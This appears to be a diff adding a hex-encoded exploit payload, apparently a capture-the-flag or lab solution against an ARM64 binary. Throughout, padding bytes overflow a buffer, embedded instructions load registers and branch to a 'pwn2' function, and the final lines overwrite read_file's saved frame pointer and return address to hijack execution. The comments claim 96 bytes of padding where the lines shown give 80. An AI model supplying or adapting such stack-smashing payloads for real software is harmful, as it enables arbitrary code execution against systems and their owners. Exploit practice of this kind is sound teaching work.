@@ -1,0 +1,14 @@
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+C0 03 80 D2 83 DA 80 D2 // Instructions to move 30 into x0 and 0x4006 into first 32-bits of x1
+03 08 A0 F2 60 00 1F D6 // Move 0xd4 into last 32-bits of x1 and branch to x1 (pwn2)
+aa aa aa aa aa aa aa aa // Clobber read_file's saved x29 (sp)
+90 c5 f0 ff ff ff 00 00 // Overwrite read_file's saved x30 to line 11 of this file
